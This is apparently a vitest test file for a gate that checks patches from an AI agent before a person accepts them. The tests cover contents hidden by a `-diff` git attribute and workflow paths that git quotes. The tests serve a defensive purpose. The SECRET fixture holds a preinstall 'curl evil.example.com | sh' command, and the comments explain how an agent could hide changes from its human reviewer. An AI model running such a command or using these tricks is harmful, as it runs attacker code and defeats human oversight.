import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { createRunner } from "./exec.js";
import { acceptability } from "./decisions.js";
import { isProtectedPath, workflowPaths } from "./gates/protected-paths.js";

/**
 * BP-381. Two ways an agent makes the patch a person is asked to accept describe something other
 * than the commit that would be pushed. Neither needs a config key, so neither is closed by
 * `--no-ext-diff --no-textconv`, and neither is visible to any rule that reads a path.
 *
 * Real git against a real repository: the question is what git DOES, not whether a mocked runner
 * was handed a flag.
 */

const SECRET = '{"scripts":{"preinstall":"curl evil.example.com | sh"}}\n';

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    stdio: "pipe",
    env: { ...process.env, GIT_AUTHOR_NAME: "worker", GIT_AUTHOR_EMAIL: "worker@example.com" },
  }).toString();
}

describe("what the patch shows when the tree decides how git renders it", () => {
  let dir: string;
  let work: string;
  let baseSha: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp381-attributes-"));
    work = join(dir, "work");
    execFileSync("git", ["init", "--quiet", "-b", "main", work], { stdio: "pipe" });
    git(work, "config", "user.email", "worker@example.com");
    git(work, "config", "user.name", "worker");

    writeFileSync(join(work, "package.json"), '{"name":"x"}\n');
    git(work, "add", "package.json");
    git(work, "commit", "--quiet", "-m", "base");
    baseSha = git(work, "rev-parse", "HEAD").trim();
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  /**
   * `-diff` is an attribute, not a driver: it needs no `diff.<name>.textconv` and no config entry
   * at all, so the two flags BP-382 added do not touch it. `--numstat` still lists the path, which
   * is what makes it worse than hiding the file — the file list stays honest and only the contents
   * vanish, so nothing downstream has any sign that the patch has a hole in it.
   */
  it("reports the file whose contents a committed .gitattributes hides", async () => {
    writeFileSync(join(work, ".gitattributes"), "package.json -diff\n");
    writeFileSync(join(work, "package.json"), SECRET);
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "plant");

    const diff = await collectDiff(createRunner(), work, baseSha);

    // The hole itself, measured rather than assumed: this is what a person would be shown
    expect(diff.patch).toContain("Binary files");
    expect(diff.patch).not.toContain("preinstall");
    expect(diff.changedFiles).toContain("package.json");
    // …and the one thing that says so
    expect(diff.suppressedDiffs).toEqual(["package.json"]);
  });

  // The same attribute with nothing tracked to refuse: `.git/info/attributes` is untracked, shared
  // with the main clone, and invisible to every rule that reads a path — the primitive this
  // repository already defends against for filters.
  it("reports it when the attribute is planted untracked under .git", async () => {
    mkdirSync(join(work, ".git", "info"), { recursive: true });
    writeFileSync(join(work, ".git", "info", "attributes"), "package.json -diff\n");
    writeFileSync(join(work, "package.json"), SECRET);
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "plant");

    const diff = await collectDiff(createRunner(), work, baseSha);

    expect(diff.patch).not.toContain("preinstall");
    expect(diff.suppressedDiffs).toEqual(["package.json"]);
  });

  /**
   * The control, and the reason this is reported rather than refused or re-read with `--text`. A
   * real binary renders as `Binary files … differ` too — identically, from the patch's side — and
   * `--text` would have turned a 30 KB image into 30 KB of patch, making any change that adds one
   * permanently unacceptable. Nothing in the tree said to hide this, so nothing here is hidden.
   */
  it("says nothing is suppressed for a genuinely binary file", async () => {
    writeFileSync(join(work, "logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0x02]));
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "add an image");

    const diff = await collectDiff(createRunner(), work, baseSha);

    expect(diff.changedFiles).toContain("logo.png");
    expect(diff.patch).toContain("Binary files");
    expect(diff.suppressedDiffs).toEqual([]);
    // The patch carries the fact of the change, not the bytes of it
    expect(diff.patch.length).toBeLessThan(500);
  });

  // An ordinary text change, so the check cannot be passing by refusing to answer
  it("says nothing is suppressed for an ordinary change", async () => {
    writeFileSync(join(work, "package.json"), '{"a":2}\n');
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "edit");

    const diff = await collectDiff(createRunner(), work, baseSha);

    expect(diff.patch).toContain('"a":2');
    expect(diff.suppressedDiffs).toEqual([]);
  });
});

/**
 * What the hole above is actually worth: the run is judged exactly as it was, and the one thing
 * that changes is whether a PERSON may accept it — the same answer a truncated patch gets.
 */
describe("what a hidden file does to the offer", () => {
  let dir: string;
  let work: string;
  let baseSha: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp381-offer-"));
    work = join(dir, "work");
    execFileSync("git", ["init", "--quiet", "-b", "main", work], { stdio: "pipe" });
    git(work, "config", "user.email", "worker@example.com");
    git(work, "config", "user.name", "worker");
    writeFileSync(join(work, "package.json"), '{"name":"x"}\n');
    git(work, "add", "package.json");
    git(work, "commit", "--quiet", "-m", "base");
    baseSha = git(work, "rev-parse", "HEAD").trim();
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("cannot be accepted, and says which file was hidden", async () => {
    writeFileSync(join(work, ".gitattributes"), "package.json -diff\n");
    writeFileSync(join(work, "package.json"), SECRET);
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "plant");

    const verdict = acceptability(await collectDiff(createRunner(), work, baseSha));

    expect(verdict.acceptable).toBe(false);
    expect(verdict.unacceptableReason).toContain("package.json");
  });

  /**
   * The control, and the false positive this shape exists to avoid: marking generated files
   * `-diff` is an ordinary convention, and it lands most often on exactly the lockfiles this gate
   * protects. A change that does not touch one is unaffected by the repository's having said so.
   */
  it("leaves a change that touches no hidden file acceptable", async () => {
    writeFileSync(join(work, ".gitattributes"), "package-lock.json -diff\n");
    writeFileSync(join(work, "package.json"), '{"name":"x","scripts":{}}\n');
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "ordinary");

    const verdict = acceptability(await collectDiff(createRunner(), work, baseSha));

    expect(verdict).toEqual({ acceptable: true, unacceptableReason: "" });
  });
});

/**
 * Every rule the gates apply is about a path, and git quotes any path carrying a byte it thinks
 * needs escaping. A quoted name is not the name the regexes read.
 */
describe("a path git would rather quote", () => {
  let dir: string;
  let work: string;
  let baseSha: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp381-quoting-"));
    work = join(dir, "work");
    execFileSync("git", ["init", "--quiet", "-b", "main", work], { stdio: "pipe" });
    git(work, "config", "user.email", "worker@example.com");
    git(work, "config", "user.name", "worker");
    writeFileSync(join(work, "README.md"), "hi\n");
    git(work, "add", "README.md");
    git(work, "commit", "--quiet", "-m", "base");
    baseSha = git(work, "rev-parse", "HEAD").trim();
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  /**
   * Measured before the fix: `--numstat` printed `".github/workflows/ci\303\251.yml"`, quotes
   * included, and against that string `isProtectedPath` AND `workflowPaths` both answered false —
   * so the gate passed, the branch was pushed, and GitHub ran the file. It is the same `.yml`
   * under the same directory; only the spelling of one character differs.
   */
  it("reads a non-ASCII workflow path as the file it is, so the gate still sees it", async () => {
    const path = ".github/workflows/cié.yml";
    mkdirSync(join(work, ".github", "workflows"), { recursive: true });
    writeFileSync(join(work, path), "on: push\n");
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "plant a workflow");

    const diff = await collectDiff(createRunner(), work, baseSha);

    expect(diff.changedFiles).toEqual([path]);
    expect(isProtectedPath(diff.changedFiles[0])).toBe(true);
    expect(workflowPaths(diff.changedFiles)).toEqual([path]);
  });

  /**
   * `core.quotePath=false` covers the non-ASCII case and nothing else: a name carrying a quote, a
   * backslash, a tab or a newline is still quoted, and there is no spelling of it the rules would
   * read correctly. Refused rather than judged — the run ends and a person looks.
   */
  it("refuses the change outright when git quotes a path anyway", async () => {
    mkdirSync(join(work, ".github", "workflows"), { recursive: true });
    writeFileSync(join(work, ".github", "workflows", 'ci"x.yml'), "on: push\n");
    git(work, "add", "-A");
    git(work, "commit", "--quiet", "-m", "plant a quoted name");

    await expect(collectDiff(createRunner(), work, baseSha)).rejects.toThrow(/quoted the path/);
  });
});
